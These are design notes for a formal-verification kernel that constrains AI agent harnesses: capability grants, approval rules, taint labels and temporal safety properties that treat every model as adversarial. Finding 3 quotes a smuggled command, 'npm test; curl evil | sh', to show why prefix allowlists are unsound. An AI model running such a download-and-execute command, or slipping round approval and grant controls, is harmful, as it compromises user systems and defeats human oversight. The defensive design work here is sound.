# Harness design session, 2026-11-01

Where the kernel redesign on the `pivot` branch stands after this session. The design below is implemented; see Implementation and Gaps at the end.

## Sources

- The outline, "Cronch: formal verification for agent harnesses", is not in Linear. It was pasted into the session from another agent's summary.
- The newest Linear document is [Harness lifecycle: write, register, prove, run, audit](https://linear.app/cronch-ai/document/harness-lifecycle-write-register-prove-run-audit-f8f7aa476e2c) (2026-10-30). It calls itself a starting point for an architecture document that hasn't been written yet.
- [Harness semantics v0](https://linear.app/cronch-ai/document/harness-semantics-v0-definitions-capabilities-properties-and-evidence-619323535a37) is marked deprecated, but this session adopts parts of it (see Decisions).

## Thesis

An entire agent harness is a program in a small interpreted language, and useful properties of its behavior can be proved. Most of them are safety properties: what the harness can never do. Every LLM is treated as adversarial, so no guarantee depends on what a model outputs. The surface language should feel like Python. Harnesses should be expressive enough to describe systems like Claude Code.

## Decisions

### Settled before this session

- Objects use deterministic CBOR and are content-addressed.
- The kernel stays Rust compiled to WASM, in its own repo. The platform is separate: Gleam orchestration with a TypeScript interface to Cloudflare Workers.
- SMT-LIB stays as an alternate serialization. z3 runs outside the kernel, in its own Worker.
- A child harness never exceeds what its planner grants, and it has no say in that. There is no escalation path: a child that lacks something returns a structured "needed X" failure.

### Settled this session

1. **State machine.** Start from the draft's `H = ⟨A, S, s₀, δ⟩`:
   - `δ` is a total, deterministic `Expr` term, `S × Inp → S × List(Act)`. It is never compiled: the term that is hashed is the one that is proved and run.
   - Inputs: `start`, `ret`, `end`, `failed`, `msg`, `refused`. Actions: `call`, `cancel`, `halt`.
   - Calls run concurrently, and results come back in any order the environment chooses.
2. **"Always allow" from a subagent widens the parent's grant.** A child's grant can't exceed its parent's, so a rule the person approves "always" in a subagent must also be added to the parent's grant. By the same argument it probably extends up to the root. That follows from the rule but hasn't been confirmed.
3. **Dynamic grants.** The interpreter, not `δ`, holds each grant's state, such as the session allowlist, and preconditions can read it. Only the root principal widens it: an "always allow" answer from `approve`, a one-time approval (an entry the matching call uses up), or a change of permission mode. Children can only narrow it. Approval rules like P1 are therefore enforced at runtime for every harness, with no per-harness proof. The cost is a larger interpreter: preconditions take grant state as a third input, there are rules for updating it, and proofs must reason about it.

### Accepted at the end of the session

Both were proposed and argued for during the session, then accepted when implementation started.

**Capabilities: contracts as predicates, grants that only narrow.**
- **Contract:** each operation has a contract `⟨In, Out, mode, pre, post, ret, effect⟩`.
  - `pre` and `post` are `Expr` predicates.
  - The interpreter checks `pre` immediately before performing the effect, whatever `δ` does.
- **Grant:** a grant can only be built with combinators that narrow it:
  - drop an operation;
  - strengthen its precondition (`pre ∧ extra`);
  - raise its return label;
  - put its names under a prefix.

  Because only these combinators exist, "construction never widens authority" is one theorem about them, proved once, not a check per grant.
- **Children:** from the parent's side, a child is treated like a model. It is an adversary that may make any call its grant allows. The parent's proof already covers every input an adversary could choose, so it covers every possible child.
- **Revocation:** a grant ends when the call that spawned the child is cancelled.
- **Rejected alternatives:**
  - allowlists of operation names, which can't scope arguments;
  - Cedar as the native policy language, which has no history and no labels;
  - effect types inside `δ`, which need a much larger type system;
  - arbitrary narrowed preconditions checked by a solver, which v0 doesn't need.

**Properties: past-time LTL over labeled trace events, proved by inductive invariants.**
- Past-time LTL compiles to a monitor whose state is added to the configuration. Proofs therefore stay inductive invariants with three obligations: initiation, consecution and safety.
- The history the property depends on is generated mechanically, outside `δ`. With invariants alone, the author would have to add flags to `δ`'s own state and keep them correct by hand.
- Every formula is a safety property, and every violation has a finite counterexample trace that the kernel can replay.
- The same formulas can be monitored at runtime before anyone proves them.
- Rejected alternatives:
  - future-time LTL, which invites liveness properties that can't hold against an adversarial model;
  - metric temporal logics, since time is out of scope for v0;
  - Cedar, which has no history;
  - session types, which don't address taint.
- Cost: first-order quantifiers make monitor state grow, so v0 only allows quantifiers bound by events, such as call identifiers and the values that appear in a call.

## Exercise: a Claude Code-style harness

The harness is a ReAct loop with these capabilities:
- `model`, which streams its output;
- `fs.read` and `fs.write`;
- `shell.run`;
- `net.fetch` and MCP tools;
- `approve`, which a person answers;
- a `user` channel carrying prompts and interrupts.

| Property                                                               | Result                                                                                                                                                                                   |
| ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| P2: no write outside the workspace                                     | A precondition on `fs.write`, so it holds for subagents inductively. Symlinks rest on assumption A1. `shell.run` is not covered without a footprint (see findings).                      |
| P4: an interrupt stops effects until the next prompt                   | `□(out(k, call(n,_), true) ∧ effect(n) → ¬(¬in(msg(user, prompt)) S in(msg(user, interrupt))))`. Easy in past-time LTL. With invariants alone, `δ` would need a flag maintained by hand. |
| P3: subagents never exceed the parent's grant                          | Holds by construction: a subagent's restricted tool list is the drop combinator.                                                                                                         |
| P1: no shell command runs unless it's on the allowlist or was approved | Didn't fit as stated. It forced the findings below.                                                                                                                                      |

Findings:

1. Spawning must be an interpreter action, `spawn(H, grant, arg)`, not a capability. Otherwise the grant would only be enforced if the parent's `δ` were proved to enforce it.
2. Each trace event needs an origin path saying which harness in the tree issued it, so properties can be stated about subagents.
3. `shell.run` takes an `argv` list and runs it without a shell. Matching command strings by prefix is unsound: a `npm test` rule matches `npm test; curl evil | sh`.
4. `effect: bool` is too coarse. Contracts need a declared footprint, an `Expr` over the arguments saying what the call may touch, vouched for by the implementation's publisher under A1.
5. A precondition sees only a call's arguments and their labels, so it can't check approval, which depends on earlier events. Resolved by decision 3 (dynamic grants).
6. Labels don't help a single-context harness: once any fetched page is in the history, every model output carries that page's label. Approval is the mechanism that works for Claude Code. Labels pay off in CaMeL-style harnesses, where the planner never sees untrusted data.

## Open questions

1. Whether an "always allow" widens every ancestor's grant up to the root, or stops somewhere lower. Implemented as one grant state for the whole tree, so it reaches the root, and siblings too (see gap 5).
2. The rest of the capability design: how contracts are typed, and how grants compose across siblings.
3. Whether the Cedar and Lean ports are exports of one proof format or separate backends.

## Kernel modules against the new design

| Module                                                  | Plan                                                                                                                                                                                                        |
| ------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cbor.rs`, `kernel-abi`, `javascript/` loader and codec | Keep. Only `index.d.ts` needs rewriting.                                                                                                                                                                    |
| `ops.rs`                                                | Keep: these are the pure operators `δ` is written with.                                                                                                                                                     |
| `types.rs`                                              | Keep, but proofs must exclude `Any`.                                                                                                                                                                        |
| `ir.rs`                                                 | Keep the pure `Expr` core, add a bounded `fold`. Turn the `ask` hole into a hole with a grant. Remove `AskSpec`, `World`, `Fact`, `Form` and `Answer`. Add Harness, Contract, Grant, Property and Evidence. |
| `eval.rs`                                               | Becomes the interpreter's core. Keep strict evaluation that continues past holes. Add label propagation.                                                                                                    |
| `check.rs`                                              | Type-checks `δ` instead of an Answer.                                                                                                                                                                       |
| `key.rs`                                                | Keep the kind-and-version prefix. Replace the kinds.                                                                                                                                                        |
| `claim.rs`                                              | Keep the principle that the kernel re-checks counterexamples itself and never accepts a solver's bare `unsat`. Generalize it to replaying traces against properties over runs.                              |
| `smtlib/`                                               | Keep the `Expr` encoding for the pure fragment and rewrite the Ask-specific parts. `readings.rs` hasn't been reviewed yet.                                                                                  |
| `api.rs`                                                | Keep one CBOR request in and one response out. Replace the request set.                                                                                                                                     |
| `assess.rs`, `validate.rs`                              | Remove. Evidence verdicts replace them, and pre- and postconditions replace validators.                                                                                                                     |
| `tests/`                                                | Keep as reference until replacements exist.                                                                                                                                                                 |

The outline mentions a "Rust λΠ rewrite kernel", but nothing like it is in this repo.

## Implementation

Built in pieces on `pivot`, one commit each, with the tests green after every piece.

| Piece                         | Commit    | What it added                                                                                                                                                                                                                  |
| ----------------------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Bounded `fold`                | `b1cb01b` | The only iteration in `Expr`.                                                                                                                                                                                                  |
| Harnesses and the interpreter | `76d114b` | `harness.rs`, `run.rs`, `labeled.rs`: harnesses, interfaces, the step rule, refusals, concurrency, streams, cancellation, withheld inputs, traces. Labels were built in here instead of as a separate piece.                   |
| Contracts and grants          | `1636209` | `pre`, `post`, `ret`, `raise`, `effect`, `footprint`, `onCall`, `onResult`; channel labels, `inv`, `onMsg`; dynamic grant state; installing under prefixes; the narrowing combinators.                                         |
| Spawning                      | `cf9f292` | Child runs against narrowed interfaces, sharing the grant state; labelled results; revocation by cancel or by the parent ending; a limit on runs that only answer each other.                                                  |
| Properties                    | `122cb32` | `property.rs`: first-order past-time LTL with quantifiers bounded by the trace, an offline evaluator, an incremental monitor for the quantifier-free fragment. `out` events carry the action's labels, shaped like the action. |
| Evidence                      | `5de23e8` | `evidence.rs`: counterexample replay, bounded search, exhaustive search over reachable configurations, evidence objects with assumptions, verification; keys for every kind of object.                                         |
| Retire the Ask era            | `f02c4bb` | Asks, Answers, worlds, validators, claims and partial evaluation removed. SMT-LIB now exports typed definitions. New API and JS types.                                                                                         |
| Compliance vectors            | `09b4037` | Eight cases in `compliance/cases/`, replayed by the Rust kernel and by the WebAssembly build.                                                                                                                                  |

## Gaps the implementation surfaced

1. **Inputs and events are typed `Any`.** The type system has no variants, so `δ`'s input and a property's events are checked when they arrive, not statically. The draft's proof fragment without `Any` needs variant types first. That also blocks exporting `δ` to SMT-LIB, since `Any` has no sort.
2. **Labels are coarse (Q1).** A harness that dispatches on `input.kind` runs every branch under the input's label, so everything it does after an untrusted result carries that label. Precise harnesses must act in response to trusted inputs, as the planner/quarantine pattern does.
3. **Exhaustive search needs finitely many configurations.** Every call takes a fresh identifier, so a harness that keeps calling never runs out of configurations, and the search stops at its limit and says so. Proofs over all depths for such harnesses need the next tier: inductive invariants over an abstraction, discharged with checkable certificates (SMT with Alethe or LFSC proofs, or Lean).
4. **Proofs are relative to an alphabet.** Bounded and exhaustive verdicts quantify only over the inputs the alphabet lists, and the evidence records that as an assumption.
5. **The grant state is shared by the whole tree.** An "always allow" given to one child widens what its parent and its siblings may do, within their own narrowings. That follows from decision 2, but siblings weren't discussed.
6. **An atom that fails to evaluate is false.** That is the right polarity under `implies` but makes a property vacuously violated if a guard is written inside the consequent. A surface syntax could make guards explicit.
7. **Not started:** the Python-like surface language and its elaborator, the Cedar and Lean ports, the Cloudflare runtime, and the architecture definition in Linear to replace the deprecated documents.
